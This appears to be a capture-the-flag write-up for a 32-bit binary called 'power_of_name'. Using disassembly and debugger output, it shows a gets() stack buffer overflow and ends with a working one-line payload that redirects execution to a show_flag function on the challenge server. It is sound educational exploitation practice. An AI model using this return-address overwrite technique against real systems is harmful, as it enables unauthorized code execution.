We are given a binary that is running on the server.

- We'll run the binary on our local machine once.

```bash
λ ./power_of_name
Enter your name: Dipesh
Hello Dipesh
```

- Running checksec on it, we'll see its addresses are fixed as theres NO PIE(Position independent executable) and there's no stack canary to protect from buffer overflows.

```bash
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- Running strings on it, the only interesting output is

```
...
/bin/cat flag.txt
Enter your name:
Hello %s
...
```

It doesnt seem to be doing much. We'll try to look into its assembly to figure out more about what's going on.

- Disassembly of main

```
080492a0 <main>:
 80492a0:       f3 0f 1e fb             endbr32
 80492a4:       55                      push   ebp
 80492a5:       89 e5                   mov    ebp,esp
 80492a7:       83 e4 f0                and    esp,0xfffffff0
 80492aa:       e8 11 00 00 00          call   80492c0 <__x86.get_pc_thunk.ax>
 80492af:       05 51 2d 00 00          add    eax,0x2d51
 80492b4:       e8 6c ff ff ff          call   8049225 <greet> // calls greet function
 80492b9:       b8 00 00 00 00          mov    eax,0x0
 80492be:       c9                      leave
 80492bf:       c3                      ret
```

It just calls greet() function and returns.

- Disassembly of greet

```
08049225 <greet>:
 8049225:       f3 0f 1e fb             endbr32
 8049229:       55                      push   ebp
 804922a:       89 e5                   mov    ebp,esp
 804922c:       53                      push   ebx
 804922d:       83 ec 74                sub    esp,0x74
 8049230:       e8 fb fe ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 8049235:       81 c3 cb 2d 00 00       add    ebx,0x2dcb
 804923b:       83 ec 0c                sub    esp,0xc
 804923e:       8d 83 1a e0 ff ff       lea    eax,[ebx-0x1fe6]
 8049244:       50                      push   eax
 8049245:       e8 46 fe ff ff          call   8049090 <printf@plt> // printf call
 804924a:       83 c4 10                add    esp,0x10
 804924d:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 8049253:       8b 00                   mov    eax,DWORD PTR [eax]
 8049255:       83 ec 0c                sub    esp,0xc
 8049258:       50                      push   eax
 8049259:       e8 42 fe ff ff          call   80490a0 <fflush@plt>
 804925e:       83 c4 10                add    esp,0x10
 8049261:       83 ec 0c                sub    esp,0xc
 8049264:       8d 45 94                lea    eax,[ebp-0x6c]
 8049267:       50                      push   eax
 8049268:       e8 43 fe ff ff          call   80490b0 <gets@plt>
 804926d:       83 c4 10                add    esp,0x10
 8049270:       83 ec 08                sub    esp,0x8
 8049273:       8d 45 94                lea    eax,[ebp-0x6c]
 8049276:       50                      push   eax
 8049277:       8d 83 2c e0 ff ff       lea    eax,[ebx-0x1fd4]
 804927d:       50                      push   eax
 804927e:       e8 0d fe ff ff          call   8049090 <printf@plt>
 8049283:       83 c4 10                add    esp,0x10
 8049286:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 804928c:       8b 00                   mov    eax,DWORD PTR [eax]
 804928e:       83 ec 0c                sub    esp,0xc
 8049291:       50                      push   eax
 8049292:       e8 09 fe ff ff          call   80490a0 <fflush@plt>
 8049297:       83 c4 10                add    esp,0x10
 804929a:       90                      nop
 804929b:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 804929e:       c9                      leave
 804929f:       c3                      ret
```

- We can see a call to gets function, which is known to be vulnerable. Except that this function also doesnt seem to be doing much. Just prints "Enter your name", which is accepts via a `gets` function call and then prints that name.

- We can pretty much guess at this point that any source of exploitation in this function would be the gets function call. Let's try to figure out what we can do.

- We'll see first what all functions are there in the binary.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049090  printf@plt
0x080490a0  fflush@plt
0x080490b0  gets@plt
0x080490c0  system@plt
0x080490d0  __libc_start_main@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  show_flag
0x08049225  greet
0x080492a0  main
0x080492c0  __x86.get_pc_thunk.ax
0x080492d0  __libc_csu_init
0x08049340  __libc_csu_fini
0x08049345  __x86.get_pc_thunk.bp
0x0804934c  _fini
```

- We see a function called show_flag. Lets disasssemble it and see what it is.

```
pwndbg> disassemble show_flag
Dump of assembler code for function show_flag:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   ebp
   0x080491fb <+5>:     mov    ebp,esp
   0x080491fd <+7>:     push   ebx
   0x080491fe <+8>:     sub    esp,0x4
   0x08049201 <+11>:    call   0x80492c0 <__x86.get_pc_thunk.ax>
   0x08049206 <+16>:    add    eax,0x2dfa
   0x0804920b <+21>:    sub    esp,0xc
   0x0804920e <+24>:    lea    edx,[eax-0x1ff8]
   0x08049214 <+30>:    push   edx
   0x08049215 <+31>:    mov    ebx,eax
   0x08049217 <+33>:    call   0x80490c0 <system@plt>
   0x0804921c <+38>:    add    esp,0x10
   0x0804921f <+41>:    nop
   0x08049220 <+42>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049223 <+45>:    leave
   0x08049224 <+46>:    ret
End of assembler dump.
```

- To check what command system is running, while running with gdb, we'll manually overwrite the return address of main to return to 0x80491f6(address of show_flag)(using set command in gdb) and then continue execution. We will see that the `system` is called with "/bin/cat flag.txt".

```
   0x8049206 <show_flag+16>    add    eax, 0x2dfa
   0x804920b <show_flag+21>    sub    esp, 0xc
   0x804920e <show_flag+24>    lea    edx, [eax - 0x1ff8]
   0x8049214 <show_flag+30>    push   edx
   0x8049215 <show_flag+31>    mov    ebx, eax
 ► 0x8049217 <show_flag+33>    call   system@plt <system@plt>
        command: 0x804a008 ◂— '/bin/cat flag.txt'

   0x804921c <show_flag+38>    add    esp, 0x10
   0x804921f <show_flag+41>    nop
   0x8049220 <show_flag+42>    mov    ebx, dword ptr [ebp - 4]
   0x8049223 <show_flag+45>    leave
   0x8049224 <show_flag+46>    ret
```

- Now we know exactly what to do. We somehow have to execute the show_flag function in the server so that we can get our flag.
- Inorder to do that, we can abuse the gets call and somehow overwrite the return address of greet to point to show_flag.
- Lets understand the greet call's memory a bit better in order to do that.

```
08049225 <greet>:
 8049225:       f3 0f 1e fb             endbr32
 8049229:       55                      push   ebp
 804922a:       89 e5                   mov    ebp,esp
 804922c:       53                      push   ebx
 804922d:       83 ec 74                sub    esp,0x74
 8049230:       e8 fb fe ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 8049235:       81 c3 cb 2d 00 00       add    ebx,0x2dcb
 804923b:       83 ec 0c                sub    esp,0xc
 804923e:       8d 83 1a e0 ff ff       lea    eax,[ebx-0x1fe6]
 8049244:       50                      push   eax
 8049245:       e8 46 fe ff ff          call   8049090 <printf@plt> // printf call
 804924a:       83 c4 10                add    esp,0x10
 804924d:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 8049253:       8b 00                   mov    eax,DWORD PTR [eax]
 8049255:       83 ec 0c                sub    esp,0xc
 8049258:       50                      push   eax
 8049259:       e8 42 fe ff ff          call   80490a0 <fflush@plt>
 804925e:       83 c4 10                add    esp,0x10
 8049261:       83 ec 0c                sub    esp,0xc
 8049264:       8d 45 94                lea    eax,[ebp-0x6c]
 8049267:       50                      push   eax
 8049268:       e8 43 fe ff ff          call   80490b0 <gets@plt>
 804926d:       83 c4 10                add    esp,0x10
 8049270:       83 ec 08                sub    esp,0x8
 8049273:       8d 45 94                lea    eax,[ebp-0x6c]
 8049276:       50                      push   eax
 8049277:       8d 83 2c e0 ff ff       lea    eax,[ebx-0x1fd4]
 804927d:       50                      push   eax
 804927e:       e8 0d fe ff ff          call   8049090 <printf@plt>
 8049283:       83 c4 10                add    esp,0x10
 8049286:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 804928c:       8b 00                   mov    eax,DWORD PTR [eax]
 804928e:       83 ec 0c                sub    esp,0xc
 8049291:       50                      push   eax
 8049292:       e8 09 fe ff ff          call   80490a0 <fflush@plt>
 8049297:       83 c4 10                add    esp,0x10
 804929a:       90                      nop
 804929b:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
 804929e:       c9                      leave
 804929f:       c3                      ret

```

`8049264: 8d 45 94 lea eax,[ebp-0x6c]`, this is loading ebp-108 as parameter for the gets call, so this is the buffer which will be filled with our input. And as expected if we give anything with more than 108 characters as input it gives seg fault.

```
λ ruby -e 'puts "A"*109' | ./power_of_name
Enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    30423 done                              ruby -e 'puts "A"*109' |
       30424 segmentation fault (core dumped)  ./power_of_name
```

- After some trial and error, when we run this, it will give us the flag

```

λ ruby -e 'puts "A"*112+"\xf6\x91\x04\x08"' | nc ctf.captainirs.dev 3001
Enter your name: Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
dctf{1m_64d_4t_m4k1n9_f1495}
```
